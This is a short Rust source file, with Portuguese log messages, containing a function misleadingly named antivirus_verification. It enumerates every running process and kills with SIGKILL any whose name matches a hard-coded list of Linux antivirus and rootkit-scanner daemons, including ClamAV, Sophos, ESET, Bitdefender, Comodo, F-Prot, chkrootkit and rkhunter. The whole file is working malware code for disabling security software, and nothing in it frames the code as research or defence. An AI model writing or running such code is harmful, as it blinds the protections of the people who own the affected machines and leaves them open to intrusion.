use procfs::process::Process;
use libc::{kill, SIGKILL};
use procfs::process::all_processes;



pub fn antivirus_verification() {

    let antivirus_processes = [
    
        "clamd",
        "freshclam",

    
        "savd",
        "savscan",
        "sav-protect",

        "esets_daemon",
        "esets",
        "bdscan",

        "cmdagent",
        "cmgdaemon",
        "fpscand",
        "fpavupdm",
        "chkrootkit",
        "rkhunter",
    ];


    for process in all_processes().unwrap() {
        let process = process.unwrap();

        let process_name = process.stat().unwrap();
        println!("PID: {} | Nome: {}", process.pid(), process_name.comm);

        for process_ant in &antivirus_processes {
            if process_name.comm == *process_ant{
                remove(process.pid());
            }
        }

        
    }
}

pub fn remove(pid: i32){

    println!("{}", pid);

    if let Ok(process) = Process::new(pid) {
        println!("Encerrando o processo: {}", process.stat().unwrap().comm);

        let result = unsafe { kill(pid, SIGKILL) };

        if result == 0 {
            println!("Processo encerrado com sucesso!");
        } else {
            eprintln!("Erro ao tentar encerrar o processo.");
        }
    } else {
        eprintln!("Processo com PID {} não encontrado.", pid);
    }

}
